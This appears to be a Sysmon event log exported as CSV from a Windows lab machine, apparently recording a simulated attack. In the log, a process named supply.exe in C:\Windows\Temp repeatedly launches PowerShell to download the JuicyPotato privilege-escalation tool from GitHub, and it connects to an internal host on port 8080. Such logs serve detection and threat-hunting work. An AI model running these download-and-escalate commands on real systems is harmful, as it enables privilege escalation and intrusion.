EventRecordID,TimeCreated.SystemTime,UtcTime,EventID,Computer,Image,CommandLine,ProcessGuid,ProcessId,User,ParentImage,ParentCommandLine,ParentProcessGuid,TargetFilename,QueryName,QueryResults,DestinationIp,DestinationHostname,DestinationPort,SourceIp,SourcePort,Protocol,Initiated,Hashes,CurrentDirectory,Description,Company,Product,Channel,Configuration,ConfigurationFileHash,Contents,Correlation,CreationUtcTime,DestinationIsIpv6,DestinationPortName,Execution.ProcessID,Execution.ThreadID,FileVersion,Hash,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Opcode,OriginalFileName,ParentProcessId,Provider.Guid,Provider.Name,QueryStatus,RuleName,SchemaVersion,Security.UserID,SourceHostname,SourceIsIpv6,SourcePortName,State,Task,TerminalSessionId,Version,xmlns
2297,2021-05-07T12:28:58.746316Z,2021-05-07 12:28:57.654,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-3289-6095-BD05-000000001D00,8232,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50810,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2298,2021-05-07T12:28:58.969961Z,2021-05-07 12:28:58.967,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328A-6095-C605-000000001D00,8340,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328A-6095-C505-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8328,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2299,2021-05-07T12:28:59.001061Z,2021-05-07 12:28:58.994,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328A-6095-C605-000000001D00,8340,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83402\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:58.994,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2300,2021-05-07T12:28:59.009927Z,2021-05-07 12:28:58.994,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328A-6095-C605-000000001D00,8340,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83402\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:58.994,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2301,2021-05-07T12:28:59.009995Z,2021-05-07 12:28:58.994,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328A-6095-C605-000000001D00,8340,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83402\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:58.994,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2302,2021-05-07T12:28:59.010081Z,2021-05-07 12:28:57.977,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-3289-6095-BF05-000000001D00,8256,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50812,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2303,2021-05-07T12:28:59.023110Z,2021-05-07 12:28:59.009,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328A-6095-C605-000000001D00,8340,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83402\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.009,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2304,2021-05-07T12:28:59.038555Z,2021-05-07 12:28:59.035,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-C705-000000001D00,8352,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328A-6095-C605-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8340,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2305,2021-05-07T12:28:59.284487Z,2021-05-07 12:28:59.282,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-C805-000000001D00,8364,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-C705-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8352,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2306,2021-05-07T12:28:59.322201Z,2021-05-07 12:28:59.306,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-C805-000000001D00,8364,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83642\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.306,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2307,2021-05-07T12:28:59.322233Z,2021-05-07 12:28:59.306,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-C805-000000001D00,8364,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83642\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.306,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2308,2021-05-07T12:28:59.325648Z,2021-05-07 12:28:59.321,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-C805-000000001D00,8364,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83642\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.321,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2309,2021-05-07T12:28:59.349845Z,2021-05-07 12:28:59.338,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-C805-000000001D00,8364,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83642\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.338,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2310,2021-05-07T12:28:59.363245Z,2021-05-07 12:28:59.360,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-C905-000000001D00,8376,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-C805-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8364,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2311,2021-05-07T12:28:59.545772Z,2021-05-07 12:28:58.303,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-328A-6095-C105-000000001D00,8280,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50814,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2312,2021-05-07T12:28:59.615500Z,2021-05-07 12:28:59.612,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-CA05-000000001D00,8388,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-C905-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8376,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2313,2021-05-07T12:28:59.655232Z,2021-05-07 12:28:59.649,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-CA05-000000001D00,8388,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83882\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.649,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2314,2021-05-07T12:28:59.659806Z,2021-05-07 12:28:59.649,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-CA05-000000001D00,8388,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83882\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.649,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2315,2021-05-07T12:28:59.681702Z,2021-05-07 12:28:59.649,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-CA05-000000001D00,8388,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83882\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.649,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2316,2021-05-07T12:28:59.681758Z,2021-05-07 12:28:59.681,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-CA05-000000001D00,8388,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI83882\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.681,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2317,2021-05-07T12:28:59.699721Z,2021-05-07 12:28:59.696,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-CB05-000000001D00,8400,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-CA05-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8388,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2318,2021-05-07T12:28:59.805333Z,2021-05-07 12:28:58.631,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-328A-6095-C305-000000001D00,8304,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50816,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2319,2021-05-07T12:28:59.944175Z,2021-05-07 12:28:59.941,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-CC05-000000001D00,8412,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-CB05-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8400,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2320,2021-05-07T12:28:59.978669Z,2021-05-07 12:28:59.963,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-CC05-000000001D00,8412,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84122\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.963,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2321,2021-05-07T12:28:59.978700Z,2021-05-07 12:28:59.963,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-CC05-000000001D00,8412,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84122\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.963,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2322,2021-05-07T12:29:00.005830Z,2021-05-07 12:28:59.978,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-CC05-000000001D00,8412,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84122\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.978,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2323,2021-05-07T12:29:00.005887Z,2021-05-07 12:28:59.994,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328B-6095-CC05-000000001D00,8412,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84122\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:28:59.994,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2324,2021-05-07T12:29:00.016532Z,2021-05-07 12:29:00.013,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328C-6095-CD05-000000001D00,8424,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328B-6095-CC05-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8412,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2325,2021-05-07T12:29:00.059989Z,2021-05-07 12:28:58.950,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-328A-6095-C505-000000001D00,8328,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50818,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2326,2021-05-07T12:29:00.316312Z,2021-05-07 12:29:00.314,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328C-6095-CE05-000000001D00,8436,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328C-6095-CD05-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8424,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2327,2021-05-07T12:29:00.347417Z,2021-05-07 12:29:00.338,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328C-6095-CE05-000000001D00,8436,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84362\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:00.338,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2328,2021-05-07T12:29:00.353471Z,2021-05-07 12:29:00.338,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328C-6095-CE05-000000001D00,8436,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84362\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:00.338,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2329,2021-05-07T12:29:00.353592Z,2021-05-07 12:28:59.265,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-328B-6095-C705-000000001D00,8352,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50820,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2330,2021-05-07T12:29:00.354031Z,2021-05-07 12:29:00.353,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328C-6095-CE05-000000001D00,8436,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84362\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:00.353,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
